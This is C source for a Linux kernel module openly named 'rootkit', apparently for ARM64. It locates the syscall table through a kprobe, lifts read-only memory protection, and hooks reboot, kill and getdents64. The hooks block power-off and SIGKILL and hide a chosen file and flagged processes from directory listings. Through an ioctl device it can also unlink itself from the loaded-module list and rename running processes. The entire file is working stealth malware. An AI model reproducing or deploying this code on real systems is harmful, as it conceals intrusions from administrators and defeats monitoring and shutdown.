#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <asm/syscall.h>
#include <linux/reboot.h>
// for getdents64 hook
#include <linux/fdtable.h>
#include <linux/proc_ns.h>

#include "rootkit.h"

// kprobe for kallsyms_lookup_name
#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};

#define OURMODNAME "rootkit"
#define PF_INVISIBLE 0x10000000

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

struct task_struct * find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

int change_process_name(const char *orig_name, const char *new_name) {
    struct task_struct *p = NULL;
    int found = 0;
    
    for_each_process(p) {
        if (strcmp(p->comm, orig_name) == 0) {
            strncpy(p->comm, new_name, TASK_COMM_LEN - 1);
            p->comm[TASK_COMM_LEN - 1] = '\0'; // make sure string tail is NULL 
            found = 1;
            printk(KERN_INFO "Process with original name '%s' found and renamed to '%s'\n", orig_name, new_name);
        }
    }

    return found ? 0 : -1;
}

static int major;
struct cdev *kernel_cdev;
char *HIDDEN_FILE = "";

// the necessary variables that the syscall table requires to access and modify 
static unsigned long *__sys_call_table;
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;
#define section_size init_begin - start_rodata

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_kill;
static t_syscall orig_reboot;
static t_syscall orig_getdents64;

// Syscall hook Part
static asmlinkage int hacked_reboot(const struct pt_regs *pt_regs) 
{
	unsigned int cmd;
	cmd = (unsigned int) pt_regs->regs[2];
	printk(KERN_INFO "enter hacked reboot section.\n");

	if(cmd == LINUX_REBOOT_CMD_POWER_OFF) {
		printk(KERN_INFO "power off command intercepted and denied.\n");
		return 0;
	}

	return orig_reboot(pt_regs);
}

static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
	int sig = (int) pt_regs->regs[1];
	printk(KERN_INFO "enter hacked kill section.\n");

	switch (sig) {
		case 9:
			printk(KERN_INFO "kill signal intercepted and denied.\n");
			break;
		default:
			return orig_kill(pt_regs);
	}
	return 0;
}

static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) 
{
	int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
	int ret = orig_getdents64(pt_regs), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;
	
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	
	// printk(KERN_INFO "HIDDEN_FILE: %s\n", HIDDEN_FILE);

	while (off < ret) {
		dir = (void *)kdirent + off;
		if (((HIDDEN_FILE && *HIDDEN_FILE != '\0') && (!proc && (memcmp(HIDDEN_FILE, dir->d_name, strlen(HIDDEN_FILE)) == 0))) || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))){
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

// hidden module part
static struct list_head *prev_module;
static short hidden = 0;
void module_show(void)
{
    /* back to the module list where we remove before */
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
	printk(KERN_INFO "module unhidden\n");
}
void module_hide(void)
{
    /* Save this module in the list before us, make this module back to the list in the same place later. */
    prev_module = THIS_MODULE->list.prev;
    /* Remove ourselves from the list module list */
    list_del(&THIS_MODULE->list);
    hidden = 1;
	printk(KERN_INFO "module hidden\n");
}


static unsigned long *get_syscall_table(void)
{
	unsigned long *syscall_table;
	
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);

	// The parameters to be obtained from kallsyms_lookup_name are generated here.
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");

	printk(KERN_INFO "sys_call_table address: %p\n", syscall_table);
	return syscall_table;
}

static inline void protect_memory(void)
{
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL_RO); // Read - only
	printk(KERN_INFO "Memory protected\n");
}

static inline void unprotect_memory(void)
{
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL); // Read - write
	printk(KERN_INFO "Memory unprotected\n");
}

static int hook(void)
{
	unprotect_memory();

	__sys_call_table[__NR_reboot] = (unsigned long) &hacked_reboot;
	__sys_call_table[__NR_kill] = (unsigned long) &hacked_kill;
	__sys_call_table[__NR_getdents64] = (unsigned long) &hacked_getdents64;

	protect_memory();
	return 0;
}

/*  --------------------------------------------------  */

static int rootkit_open(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
{
	struct hided_file file_info;
	struct masq_proc_req user_req;
	struct masq_proc *req_array;
	int ret = 0;
	int i;
	switch(ioctl) {
		case IOCTL_MOD_HOOK:
			hook();
			break;
		case IOCTL_MOD_HIDE:
			if (hidden == 0) {
				module_hide();
			} else {
				module_show();
			}
			break;
		case IOCTL_MOD_MASQ:
			if (copy_from_user(&user_req, (struct masq_proc_req *)arg, sizeof(struct masq_proc_req)))
				return -EFAULT;

			// printk(KERN_INFO "Received masq_proc_req: len = %zu\n", user_req.len);
			req_array = kmalloc_array(user_req.len, sizeof(struct masq_proc), GFP_KERNEL);
			if (!req_array) {
				printk(KERN_INFO "Memory allocation failed\n");
				return -ENOMEM;
			}

			if (copy_from_user(req_array, user_req.list, user_req.len * sizeof(struct masq_proc))) {
				kfree(req_array);
				return -EFAULT;
			}

			for (i = 0; i < user_req.len; ++i) {
				if (strlen(req_array[i].new_name) >= strlen(req_array[i].orig_name)) {
					// printk(KERN_INFO "Error: New name '%s' should be shorter than original name '%s'\n", req_array[i].new_name, req_array[i].orig_name);
					continue;
				}
				change_process_name(req_array[i].orig_name, req_array[i].new_name);
				// printk(KERN_INFO "Received masq_proc[%zu]: Original name: %s, New name: %s\n", i, req_array[i].orig_name, req_array[i].new_name);
			}

			kfree(req_array);
			break;
		case IOCTL_FILE_HIDE:
			if (copy_from_user(&file_info, (struct hided_file *)arg, sizeof(struct hided_file)))
                return -EFAULT;
            printk(KERN_INFO "Received hidden file: %s, size: %lu\n", file_info.name, file_info.len);
			HIDDEN_FILE = kmalloc(file_info.len, GFP_KERNEL);
			memcpy(HIDDEN_FILE, file_info.name, file_info.len);
			HIDDEN_FILE[file_info.len - 1] = '\0';
			break;
		default:
			ret = -EINVAL;
	}
	printk(KERN_INFO "%s\n", __func__);
	return ret;
}

struct file_operations fops = {
	open: rootkit_open,
	unlocked_ioctl: rootkit_ioctl,
	release: rootkit_release,
	owner: THIS_MODULE
};

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no, dev;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	printk("The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info(KERN_INFO "unable to allocate cdev");
		return ret;
	}

	// get __sys_call_table's address
	__sys_call_table = get_syscall_table();
	if(!__sys_call_table) {
		printk(KERN_INFO "Failed to find sys_call_table\n");
		return 1;
	}

	printk(KERN_INFO "__NR_reboot: %d\n", __NR_reboot);
	printk(KERN_INFO "__NR_kill: %d\n", __NR_kill);
	printk(KERN_INFO "__NR_getdents64: %d\n", __NR_getdents64);

	// To store original syscall table addresses
	orig_reboot = (t_syscall)__sys_call_table[__NR_reboot];
	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];

	return 0;
}

static void __exit rootkit_exit(void)
{
	// Unhook syscall
	unprotect_memory();

	__sys_call_table[__NR_reboot] = (unsigned long)orig_reboot; 
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	
	protect_memory();

	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
